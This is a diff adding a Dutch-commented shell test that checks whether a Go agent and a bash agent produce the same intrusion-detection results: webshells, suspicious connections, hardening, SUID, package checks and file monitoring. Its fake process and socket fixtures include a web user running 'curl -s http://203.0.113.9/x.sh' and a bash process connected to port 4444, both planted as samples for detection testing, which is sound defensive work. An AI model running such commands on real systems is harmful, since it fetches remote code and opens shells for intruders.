@@ -1056,6 +1056,148 @@ if bad or len(a['files']) < 5 or len(a['users']) < 3:
 print('✔ IDS als proef (alleen waarnemen): %d gevoelige bestanden (SHA-256), %d gebruikers, %d groepen, %d kernelmodules en een proces uit /tmp: gelijk aan de bash-agent' % (len(a['files']), len(a['users']), len(a['groups']), len(a['modules'])))
 PY
 
+# 1.359.0 (Go-agent 0.28.0): de rest van het IDS-waarnemen: webshells, verbindingen, hardening, SUID, pakketcontrole en
+# bestanden bewaken. De echte bash-code en de Go-agent krijgen dezelfde namaak-ps en -ss en dezelfde bestanden.
+J="$work/ids2"; mkdir -p "$J/bin" "$J/b" "$J/gc" "$J/gd" "$J/w/etc/app/cache" "$J/w/etc/app/sub dir" "$J/w/srv" "$J/suid/usr/bin" "$J/suid/var/lib/docker/x" "$J/suid/home/piet/.local/share/containers/y"
+sleep 60 & j_pid=$!
+cat >"$J/ps.txt" <<EOF
+    1     0 root                             systemd         /usr/lib/systemd/systemd
+  700     1 root                             nginx           nginx: master process /usr/sbin/nginx
+  701   700 www-data                         nginx           nginx: worker process
+  702   701 www-data                         php-fpm8.2      php-fpm: pool www
+$$   702 www-data                         sh              sh -c id; uname -a "x\\y"
+$j_pid     1 apache                           curl            curl -s http://203.0.113.9/x.sh
+  705   702 www-data                         sh              sh -c /usr/sbin/sendmail -t -i
+  706     1 root                             bash            -bash
+  707   706 root                             python3.11      python3.11 -m http.server
+EOF
+cat >"$J/ss-l.txt" <<'EOF'
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=800,fd=3))
+LISTEN 0      80           0.0.0.0:3306       0.0.0.0:*    users:(("mariadbd",pid=810,fd=20))
+LISTEN 0      511                *:443              *:*    users:(("nginx",pid=700,fd=6))
+LISTEN 0      4096         0.0.0.0:2375       0.0.0.0:*    users:(("dockerd",pid=820,fd=4))
+LISTEN 0      128             [::]:5432          [::]:*    users:(("postgres",pid=830,fd=5))
+LISTEN 0      128        127.0.0.1:6379       0.0.0.0:*    users:(("redis",pid=840,fd=5))
+EOF
+cat >"$J/ss-lu.txt" <<'EOF'
+udp   UNCONN 0      0            0.0.0.0:69         0.0.0.0:*    users:(("tftpd",pid=850,fd=4))
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=800,fd=3))
+tcp   LISTEN 0      128          0.0.0.0:23         0.0.0.0:*    users:(("telnetd",pid=860,fd=3))
+tcp   LISTEN 0      128          0.0.0.0:21         0.0.0.0:*    users:(("vsftpd",pid=870,fd=3))
+EOF
+cat >"$J/ss-e.txt" <<'EOF'
+0      0      192.168.1.10:22        192.168.1.50:51234 users:(("sshd",pid=900,fd=4),("sshd",pid=899,fd=4))
+0      0      192.168.1.10:44322     203.0.113.7:443   users:(("curl",pid=910,fd=5))
+0      0      192.168.1.10:44323     203.0.113.7:443   users:(("curl",pid=911,fd=5))
+0      0      192.168.1.10:50000     198.51.100.3:4444  users:(("sleep",pid=920,fd=0),("bash",pid=921,fd=0))
+0      0      192.168.1.10:50001     198.51.100.4:31337 users:(("evil",pid=930,fd=3))
+0      0      127.0.0.1:50002        127.0.0.1:5432    users:(("php",pid=940,fd=3))
+0      0      192.168.1.10:50003     10.0.0.5:5432     users:(("php",pid=941,fd=3))
+0      0      192.168.1.10:50004     172.20.1.1:80     users:(("php",pid=942,fd=3))
+0      0      192.168.1.10:50005     172.32.1.1:80     users:(("php",pid=943,fd=3))
+0      0      [2001:db8::1]:50006    [2001:db8::99]:6667 users:(("irc bot",pid=944,fd=3))
+0      0      [fd00::1]:50007        [fd00::2]:80      users:(("php",pid=945,fd=3))
+0      0      192.168.1.10:443       203.0.113.50:60111 users:(("nginx",pid=701,fd=9))
+0      0      192.168.1.10:50008     203.0.113.60:80
+EOF
+cat >"$J/bin/ps" <<EOF
+#!/bin/sh
+cat "$J/ps.txt"
+EOF
+cat >"$J/bin/ss" <<EOF
+#!/bin/sh
+case "\$*" in *established*) cat "$J/ss-e.txt" ;; *-Htulnp*) cat "$J/ss-lu.txt" ;; *) cat "$J/ss-l.txt" ;; esac
+EOF
+chmod +x "$J/bin/ps" "$J/bin/ss"
+# bestanden om te bewaken: een map met uitzonderingen, een los bestand, jokertekens, een koppeling en bijzondere rechten
+printf 'a=1\n' >"$J/w/etc/app/app.conf"; printf 'log\n' >"$J/w/etc/app/app.log"; printf 'c\n' >"$J/w/etc/app/cache/c.dat"
+printf 'x y\n' >"$J/w/etc/app/sub dir/met spatie.txt"; printf 'weg\n' >"$J/w/etc/app/weg.txt"; printf 'los\n' >"$J/w/srv/los.bin"
+printf 'een\n' >"$J/w/srv/a.pem"; printf 'twee\n' >"$J/w/srv/b.pem"; printf 'niet\n' >"$J/w/srv/c.txt"
+ln -s app.conf "$J/w/etc/app/link.conf"; ln -s los.bin "$J/w/srv/los-link"
+chmod 4755 "$J/w/srv/los.bin"; chmod 600 "$J/w/srv/a.pem"; chmod 1644 "$J/w/etc/app/app.conf" 2>/dev/null || true
+fim_cfg=$(printf 'e\t1700000001\np\t2\t%s\np\t1\t%s\np\t1\t%s\np\t2\t%s\np\t1\t%s\nx\t*.log\nx\tcache/\nx\t%s\n' "$J/w/etc/app" "$J/w/srv/los.bin" "$J/w/srv/*.pem" "$J/w/srv/los-link" "$J/w/etc/**/app.conf" "$J/w/srv/b.pem")
+printf '0\tids\tlearn\n0\tfim\t%s\n' "$(printf '%s' "$fim_cfg" | base64 -w0)" >"$J/b/tests.cache"; cp "$J/b/tests.cache" "$J/gc/tests.cache"
+ids_bash() {  # ids_bash <uitvoerbestand>: de echte code van de bash-agent, met de namaak-ps en -ss
+    (
+        export PATH="$J/bin:$PATH"
+        t_dir="$J/b"; t_cache="$J/b/tests.cache"; i_dir="$J/b/ids"; mkdir -p "$i_dir"; ids_mode=learn; ids_json=""
+        ids_bg() { :; }
+        rm -f "$i_dir/hard" "$J/b/ss_t" "$J/b/ss_tu"
+        # shellcheck disable=SC1090
+        source <(sed -n '/^json_escape() {/,/^}/p; /^json_text() {/,/^}/p' agent/src/15-realtime.sh; sed -n '/^ss_listen() {/,/^}/p' agent/src/00-kop.sh)
+        # shellcheck disable=SC1090
+        source <(sed -n '/^    web_json=""$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
+        # shellcheck disable=SC1090
+        source <(sed -n '/^    hard_part=""$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
+        # shellcheck disable=SC1090
+        source <(sed -n '/^    conns_json=""; out_json=""/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
+        # shellcheck disable=SC1090
+        source <(sed -n '/^    fim_dir="\$i_dir\/fim"$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
+        # shellcheck disable=SC2154
+        printf '{"web":[%s],"conns":[%s],"out":[%s]%s,%s"x":0}' "${web_json%,}" "${conns_json%,}" "${out_json%,}" "$hard_part" "$ids_json" >"$1"
+    ) || fail "de bash-code voor het IDS (tweede deel) faalde"
+}
+ids_go() { PATH="$J/bin:$PATH" RZSENSE_BASH_CACHE="$J/gc" RZSENSE_DATA="$J/gd" RZSENSE_TEST_FIMOLD="${2-}" "$work/rzsense" ids-obs2 >"$1" || fail "de Go-agent kon het tweede deel van het IDS niet waarnemen"; }
+ids_bash "$J/bash1.json"; ids_go "$J/go1.json"
+cp "$J/b/ids/fim/state.new" "$J/state1"
+# de stand vastleggen (zoals na een aangenomen rapport), dan: inhoud veranderd met dezelfde grootte en tijd (de hash blijft),
+# een nieuw bestand, een verdwenen bestand, andere rechten
+cp "$J/b/ids/fim/state.new" "$J/b/ids/fim/state"; cp "$J/b/ids/fim/meta.new" "$J/b/ids/fim/meta"; cp "$J/b/ids/fim/roots.new" "$J/b/ids/fim/roots"
+cp -p "$J/w/srv/a.pem" "$J/a.keep"; printf 'EEN\n' >"$J/w/srv/a.pem"; touch -r "$J/a.keep" "$J/w/srv/a.pem"
+printf 'nieuw\n' >"$J/w/etc/app/nieuw.txt"; rm -f "$J/w/etc/app/weg.txt"; chmod 640 "$J/w/etc/app/sub dir/met spatie.txt"
+ids_bash "$J/bash2.json"; ids_go "$J/go2.json" "$J/b/ids/fim/state"
+kill "$j_pid" 2>/dev/null || true
+# SUID: echte find tegenover de Go-agent, in een namaak-boom (container-images worden overgeslagen)
+for f in usr/bin/su usr/bin/gewoon var/lib/docker/x/su home/piet/.local/share/containers/y/su; do printf 'x' >"$J/suid/$f"; done
+chmod 4755 "$J/suid/usr/bin/su" "$J/suid/var/lib/docker/x/su" "$J/suid/home/piet/.local/share/containers/y/su"
+(cd "$J/suid" && find . -xdev \( -path ./proc -o -path ./var/lib/docker -o -path './home/*/.local/share/containers' \) -prune -o -type f -perm -4000 -print | sed 's/^\.//' | sort) >"$J/suid.find"
+"$work/rzsense" ids-obs2 suid "$J/suid" 2>/dev/null | python3 -I -c 'import json,sys; print("\n".join(sorted(json.load(sys.stdin)["suid"])))' >"$J/suid.go"
+cmp -s "$J/suid.find" "$J/suid.go" && [ "$(cat "$J/suid.go")" = /usr/bin/su ] || fail "SUID-bestanden: find vond $(tr '\n' ' ' <"$J/suid.find"), de Go-agent $(tr '\n' ' ' <"$J/suid.go")"
+# pakketcontrole: de uitvoer van rpm -Va en debsums -c door hetzelfde filter
+printf 'S.5....T.  c /etc/ssh/sshd_config\n..5....T.    /usr/bin/ls\n.M.......    /usr/bin/su\nS.5....T.    /usr/share/doc/x\nmissing     /usr/lib64/libx.so\n..5......  d /usr/lib/systemd/y\n' >"$J/rpm.txt"
+want=$(awk '$1 ~ /^..5/ { print $NF }' "$J/rpm.txt" | grep -E '^/(usr/)?(s?bin|lib|lib64)/' | head -n 100 | tr '\n' ' ')
+got=$("$work/rzsense" ids-pkgdiff rpm <"$J/rpm.txt" | python3 -I -c 'import json,sys; print("".join(p + " " for p in json.load(sys.stdin)))')
+[ "$want" = "$got" ] && [ "$got" = "/usr/bin/ls /usr/lib/systemd/y " ] || fail "pakketcontrole (rpm): bash '$want', go '$got'"
+printf '/usr/bin/gewijzigd\n/etc/iets\n/lib/x86_64-linux-gnu/libz.so.1\n' >"$J/deb.txt"
+want=$(grep -E '^/(usr/)?(s?bin|lib|lib64)/' "$J/deb.txt" | head -n 100 | tr '\n' ' ')
+got=$("$work/rzsense" ids-pkgdiff deb <"$J/deb.txt" | python3 -I -c 'import json,sys; print("".join(p + " " for p in json.load(sys.stdin)))')
+[ "$want" = "$got" ] || fail "pakketcontrole (debsums): bash '$want', go '$got'"
+python3 -I - "$J" <<'PY' || fail "de Go-agent neemt voor het IDS (tweede deel) iets anders waar dan de bash-agent"
+import json, sys
+J = sys.argv[1]
+bad = []
+for r in ('1', '2'):
+    a, g = [json.load(open('%s/%s%s.json' % (J, w, r))) for w in ('bash', 'go')]
+    for k in ('web', 'conns', 'out', 'fimc'):
+        if a[k] != g[k]:
+            bad.append('ronde %s %s:\n  bash %s\n  go   %s' % (r, k, json.dumps(a[k]), json.dumps(g[k])))
+    ha, hg = a['hard'], g['hard']
+    for k in sorted(set(ha) | set(hg)):
+        va, vg = ha.get(k), hg.get(k)
+        if k in ('ww_files', 'sudo_nopw') and va is not None and vg is not None:
+            va, vg = sorted(va.split(',')), sorted(vg.split(','))
+        if va != vg:
+            bad.append('ronde %s hardening %s: bash %r, go %r' % (r, k, va, vg))
+    sa = sorted(open('%s/b/ids/fim/state.new' % J).read().splitlines()) if r == '2' else sorted(open('%s/state1' % J).read().splitlines())
+    sg = sorted(g['fim_state'].splitlines())
+    if sa != sg:
+        bad.append('ronde %s bestanden bewaken:\n  alleen bash %s\n  alleen go   %s' % (r, [l for l in sa if l not in sg][:4], [l for l in sg if l not in sa][:4]))
+    if a['fim']['n'] != g['fim']['n'] or a['fim']['n'] != len(sa):
+        bad.append('ronde %s aantal bewaakte bestanden: bash %s, go %s' % (r, a['fim']['n'], g['fim']['n']))
+a1 = json.load(open(J + '/bash1.json')); a2 = json.load(open(J + '/bash2.json')); g2 = json.load(open(J + '/go2.json'))
+names1 = sorted(l.split('\t')[0].replace(J + '/w', '') for l in open(J + '/state1'))
+want = ['/etc/app/app.conf', '/etc/app/sub dir/met spatie.txt', '/etc/app/weg.txt', '/srv/a.pem', '/srv/los.bin']
+web = sorted((w['tool'], w['web'], w['user']) for w in a1['web'])
+conn = sorted((c['kind'], c['proc']) for c in a1['conns'])
+ch = sorted(e[0].replace(J + '/w', '') for e in a2['fim']['c'])
+if bad or names1 != want or web != [('curl', 'user:apache', 'apache'), ('sh', 'php-fpm8.2', 'www-data')] or conn != [('port', 'evil'), ('port', 'irc bot'), ('shell', 'bash')] \
+        or a1['hard'].get('open_db') != '3306,5432' or a1['hard'].get('docker_sock') != 'tcp' or a1['hard'].get('legacy_svc') != '21,23,69' or 'uid0' not in a1['hard'] \
+        or ch != ['/etc/app/nieuw.txt', '/etc/app/sub dir/met spatie.txt'] or len(a2['fim']['d']) != 1 or len(g2['fim']['sample']) != g2['fim']['n']:
+    print('\n'.join(bad) or 'onverwachte testgegevens: %s' % json.dumps([names1, web, conn, a1['hard'], ch, a2['fim']], ensure_ascii=False)[:2500]); sys.exit(1)
+print('✔ IDS als proef, tweede deel: %d webshells, %d verdachte verbindingen, %d uitgaande adressen, hardening (%d instellingen), SUID, pakketcontrole en bestanden bewaken (%d bestanden; uitzonderingen, jokertekens, een ongewijzigde tijd): gelijk aan de bash-agent'
+      % (len(a1['web']), len(a1['conns']), len(a1['out']), len(a1['hard']), a1['fim']['n']))
+PY
+
 # ---------------------------------------------------------------- 1.344.0: overnemen per server
 # systemd is er hier niet: een namaak-systemctl houdt bij welke timers aan staan. De rest is echt: RzSense vraagt het in
 # het antwoord op een proefronde, de Go-agent haalt de testlijst op en stuurt het echte rapport, en RzSense neemt dat aan.
